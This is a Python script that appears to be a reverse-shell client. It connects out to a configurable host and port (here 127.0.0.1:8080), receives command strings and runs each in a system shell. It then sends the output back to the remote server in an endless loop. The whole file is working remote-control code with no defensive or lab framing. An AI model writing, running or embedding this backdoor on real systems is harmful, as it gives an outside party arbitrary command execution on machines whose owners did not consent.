import socket
import subprocess

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.dest = (self.host, self.port)
 
    def connect(self):
        '''
        Connects to the remote server.
        '''
        self.socket_tcp.connect(self.dest)
        return self.socket_tcp
    
    def send(self, data):
        '''
        Sends data to the server.
        '''
        self.socket_tcp.sendall(data)
    
    def recv(self, size):
        '''
        Receives data from the server.
        '''
        return self.socket_tcp.recv(size).decode()
    
    def execute_command(self, command):
        '''
        Executes a command and returns the output.
        '''
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result
    
    def close(self):
        self.socket_tcp.close()


RHOST = '127.0.0.1'
RPORT = 8080

client = Client(RHOST, RPORT)
try:
    client.connect()
    while True:
        data = client.recv(1024)
        print(f'\nExecuting command: {data}')
        output = client.execute_command(data)
        print(f'\nOutput: {output.stdout}')
        client.send(output.stdout.encode())

except KeyboardInterrupt:
    print("\nClosing the client...")
    client.close()
    exit(0)

except Exception as e:
    print("\nError:", e)
    client.close()
    exit(1)